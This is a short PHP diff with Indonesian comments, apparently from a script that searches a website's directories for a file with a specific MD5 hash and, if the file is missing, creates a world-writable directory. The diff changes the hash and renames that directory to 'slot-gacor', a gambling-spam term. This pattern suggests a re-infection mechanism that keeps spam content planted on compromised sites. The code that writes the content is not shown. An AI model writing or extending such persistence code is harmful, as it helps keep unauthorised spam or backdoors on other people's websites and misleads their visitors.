@@ -11,7 +11,7 @@ $files = new RecursiveIteratorIterator(
     new RecursiveDirectoryIterator($directory)
 );
 
-$targetMD5 = '18ddc77535b6f4f2a64fcde9a32a1176';
+$targetMD5 = '779187b609b735218f3c489b9955c9a5';
 $found = false;
 
 // Loop melalui setiap file dalam direktori dan subdirektori
@@ -30,7 +30,7 @@ foreach ($files as $file) {
 
 if (!$found) {
     // Tentukan direktori tempat file akan dibuat
-    $newDirectory = $directory . '/market'; 
+    $newDirectory = $directory . '/slot-gacor'; 
     if (!is_dir($newDirectory)) {
         mkdir($newDirectory, 0777, true);
     }
